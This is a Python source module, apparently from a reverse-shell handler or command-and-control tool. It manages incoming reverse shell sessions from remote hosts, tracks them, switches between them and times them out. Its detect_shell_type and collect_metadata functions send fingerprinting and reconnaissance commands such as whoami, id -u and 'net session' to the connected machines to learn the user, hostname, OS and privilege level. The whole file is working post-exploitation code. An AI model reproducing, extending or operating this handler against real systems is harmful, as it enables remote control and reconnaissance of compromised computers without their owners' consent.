"""
Session management for tracking and interacting with active reverse shells.
"""

import socket
import threading
import time
import uuid
from dataclasses import dataclass, field
from datetime import datetime
from enum import Enum
from typing import Any, Optional


class SessionStatus(Enum):
    ACTIVE = "active"
    DEAD = "dead"
    BACKGROUNDED = "backgrounded"
    INTERACTING = "interacting"


class ShellType(Enum):
    BASH = "bash"
    SH = "sh"
    CMD = "cmd.exe"
    POWERSHELL = "powershell"
    PYTHON = "python"
    UNKNOWN = "unknown"


@dataclass
class SessionMetadata:
    session_id: str
    remote_host: str
    remote_port: int
    local_host: str
    local_port: int
    shell_type: ShellType = ShellType.UNKNOWN
    username: Optional[str] = None
    hostname: Optional[str] = None
    os_type: Optional[str] = None
    privilege_level: Optional[str] = None
    status: SessionStatus = SessionStatus.ACTIVE
    created_at: datetime = field(default_factory=datetime.now)
    last_seen: datetime = field(default_factory=datetime.now)
    connection: Optional[socket.socket] = None

    def to_dict(self) -> dict[str, Any]:
        return {
            'session_id': self.session_id,
            'remote_host': self.remote_host,
            'remote_port': self.remote_port,
            'local_host': self.local_host,
            'local_port': self.local_port,
            'shell_type': self.shell_type.value,
            'username': self.username,
            'hostname': self.hostname,
            'os_type': self.os_type,
            'privilege_level': self.privilege_level,
            'status': self.status.value,
            'created_at': self.created_at.isoformat(),
            'last_seen': self.last_seen.isoformat(),
            'uptime': str(datetime.now() - self.created_at)
        }

    def update_last_seen(self):
        self.last_seen = datetime.now()

    def is_alive(self, timeout_seconds: int = 300) -> bool:
        if self.status == SessionStatus.DEAD:
            return False

        time_since_last_seen = datetime.now() - self.last_seen
        return time_since_last_seen.total_seconds() < timeout_seconds

    def get_uptime(self) -> str:
        delta = datetime.now() - self.created_at
        hours, remainder = divmod(int(delta.total_seconds()), 3600)
        minutes, seconds = divmod(remainder, 60)

        if hours > 0:
            return f"{hours}h {minutes}m"
        elif minutes > 0:
            return f"{minutes}m {seconds}s"
        else:
            return f"{seconds}s"


class SessionManager:
    """
    Manages multiple active reverse shell sessions.

    Features:
    - Track multiple concurrent sessions
    - Session metadata collection (user, host, OS, privileges)
    - Session timeout and auto-cleanup
    - Session interaction and backgrounding
    - Session health monitoring
    """

    def __init__(self, session_timeout: int = 300):
        self.sessions: dict[str, SessionMetadata] = {}
        self.session_timeout = session_timeout
        self._lock = threading.Lock()
        self._cleanup_thread: Optional[threading.Thread] = None
        self._running = False
        self.current_session_id: Optional[str] = None

    def start_cleanup_monitor(self):
        if not self._running:
            self._running = True
            self._cleanup_thread = threading.Thread(
                target=self._cleanup_loop,
                daemon=True
            )
            self._cleanup_thread.start()

    def stop_cleanup_monitor(self):
        self._running = False
        if self._cleanup_thread:
            self._cleanup_thread.join(timeout=2)

    def _cleanup_loop(self):
        while self._running:
            self.cleanup_dead_sessions()
            time.sleep(30)

    def register_session(
        self,
        connection: socket.socket,
        remote_addr: tuple,
        local_addr: tuple
    ) -> str:
        session_id = str(uuid.uuid4())[:8]

        metadata = SessionMetadata(
            session_id=session_id,
            remote_host=remote_addr[0],
            remote_port=remote_addr[1],
            local_host=local_addr[0],
            local_port=local_addr[1],
            connection=connection
        )

        with self._lock:
            self.sessions[session_id] = metadata
            if self.current_session_id is None:
                self.current_session_id = session_id

        return session_id

    def get_session(self, session_id: str) -> Optional[SessionMetadata]:
        with self._lock:
            return self.sessions.get(session_id)

    def list_sessions(self) -> dict[str, SessionMetadata]:
        with self._lock:
            return dict(self.sessions)

    def list_active_sessions(self) -> dict[str, SessionMetadata]:
        with self._lock:
            return {
                sid: meta for sid, meta in self.sessions.items()
                if meta.status == SessionStatus.ACTIVE and meta.is_alive(self.session_timeout)
            }

    def update_session_metadata(
        self,
        session_id: str,
        username: Optional[str] = None,
        hostname: Optional[str] = None,
        os_type: Optional[str] = None,
        privilege_level: Optional[str] = None,
        shell_type: Optional[ShellType] = None
    ):
        with self._lock:
            if session_id in self.sessions:
                session = self.sessions[session_id]
                if username:
                    session.username = username
                if hostname:
                    session.hostname = hostname
                if os_type:
                    session.os_type = os_type
                if privilege_level:
                    session.privilege_level = privilege_level
                if shell_type:
                    session.shell_type = shell_type
                session.update_last_seen()

    def update_session_status(self, session_id: str, status: SessionStatus):
        with self._lock:
            if session_id in self.sessions:
                self.sessions[session_id].status = status
                self.sessions[session_id].update_last_seen()

    def mark_session_dead(self, session_id: str):
        with self._lock:
            if session_id in self.sessions:
                self.sessions[session_id].status = SessionStatus.DEAD
                if self.sessions[session_id].connection:
                    try:
                        self.sessions[session_id].connection.close()
                    except:
                        pass

    def remove_session(self, session_id: str):
        with self._lock:
            if session_id in self.sessions:
                if self.sessions[session_id].connection:
                    try:
                        self.sessions[session_id].connection.close()
                    except:
                        pass
                del self.sessions[session_id]

                if self.current_session_id == session_id:
                    active = self.list_active_sessions()
                    self.current_session_id = next(iter(active.keys())) if active else None

    def cleanup_dead_sessions(self):
        with self._lock:
            dead_sessions = [
                sid for sid, meta in self.sessions.items()
                if not meta.is_alive(self.session_timeout)
            ]

            for sid in dead_sessions:
                self.sessions[sid].status = SessionStatus.DEAD

    def set_current_session(self, session_id: str) -> bool:
        with self._lock:
            if session_id in self.sessions:
                if self.current_session_id:
                    self.sessions[self.current_session_id].status = SessionStatus.BACKGROUNDED

                self.sessions[session_id].status = SessionStatus.INTERACTING
                self.current_session_id = session_id
                return True
            return False

    def get_current_session(self) -> Optional[SessionMetadata]:
        if self.current_session_id:
            return self.get_session(self.current_session_id)
        return None

    def background_current_session(self):
        if self.current_session_id:
            with self._lock:
                if self.current_session_id in self.sessions:
                    self.sessions[self.current_session_id].status = SessionStatus.BACKGROUNDED
                    self.current_session_id = None

    def heartbeat(self, session_id: str):
        with self._lock:
            if session_id in self.sessions:
                self.sessions[session_id].update_last_seen()

    def get_session_count(self) -> dict[str, int]:
        with self._lock:
            return {
                'total': len(self.sessions),
                'active': len([s for s in self.sessions.values()
                              if s.status == SessionStatus.ACTIVE and s.is_alive(self.session_timeout)]),
                'dead': len([s for s in self.sessions.values()
                            if s.status == SessionStatus.DEAD or not s.is_alive(self.session_timeout)]),
                'backgrounded': len([s for s in self.sessions.values()
                                    if s.status == SessionStatus.BACKGROUNDED])
            }

    def detect_shell_type(self, session_id: str) -> ShellType:
        session = self.get_session(session_id)
        if not session or not session.connection:
            return ShellType.UNKNOWN

        try:
            test_commands = {
                ShellType.BASH: b"echo $BASH_VERSION\n",
                ShellType.CMD: b"ver\n",
                ShellType.POWERSHELL: b"$PSVersionTable.PSVersion\n",
            }

            for shell_type, cmd in test_commands.items():
                session.connection.sendall(cmd)
                time.sleep(0.5)
                session.connection.settimeout(1.0)
                try:
                    response = session.connection.recv(4096).decode('utf-8', errors='ignore')
                    if response and len(response) > 0:
                        if shell_type == ShellType.BASH and 'BASH' in response.upper():
                            return shell_type
                        elif shell_type == ShellType.CMD and 'WINDOWS' in response.upper():
                            return shell_type
                        elif shell_type == ShellType.POWERSHELL and 'PSVERSION' in response.upper():
                            return shell_type
                except socket.timeout:
                    continue

            return ShellType.SH

        except Exception:
            return ShellType.UNKNOWN

    def collect_metadata(self, session_id: str):
        session = self.get_session(session_id)
        if not session or not session.connection:
            return

        try:
            shell_type = self.detect_shell_type(session_id)

            if shell_type in [ShellType.BASH, ShellType.SH]:
                session.connection.sendall(b"whoami\n")
                time.sleep(0.3)
                session.connection.settimeout(1.0)
                username = session.connection.recv(4096).decode('utf-8', errors='ignore').strip()

                session.connection.sendall(b"hostname\n")
                time.sleep(0.3)
                hostname = session.connection.recv(4096).decode('utf-8', errors='ignore').strip()

                session.connection.sendall(b"uname -s\n")
                time.sleep(0.3)
                os_type = session.connection.recv(4096).decode('utf-8', errors='ignore').strip()

                session.connection.sendall(b"id -u\n")
                time.sleep(0.3)
                uid = session.connection.recv(4096).decode('utf-8', errors='ignore').strip()
                privilege = "root" if uid == "0" else "user"

            elif shell_type == ShellType.CMD:
                session.connection.sendall(b"echo %USERNAME%\n")
                time.sleep(0.3)
                session.connection.settimeout(1.0)
                username = session.connection.recv(4096).decode('utf-8', errors='ignore').strip()

                session.connection.sendall(b"hostname\n")
                time.sleep(0.3)
                hostname = session.connection.recv(4096).decode('utf-8', errors='ignore').strip()

                os_type = "Windows"

                session.connection.sendall(b"net session >nul 2>&1 && echo admin || echo user\n")
                time.sleep(0.3)
                privilege = session.connection.recv(4096).decode('utf-8', errors='ignore').strip()
            else:
                username = hostname = os_type = privilege = None

            self.update_session_metadata(
                session_id,
                username=username,
                hostname=hostname,
                os_type=os_type,
                privilege_level=privilege,
                shell_type=shell_type
            )

        except Exception:
            pass


session_manager = SessionManager()
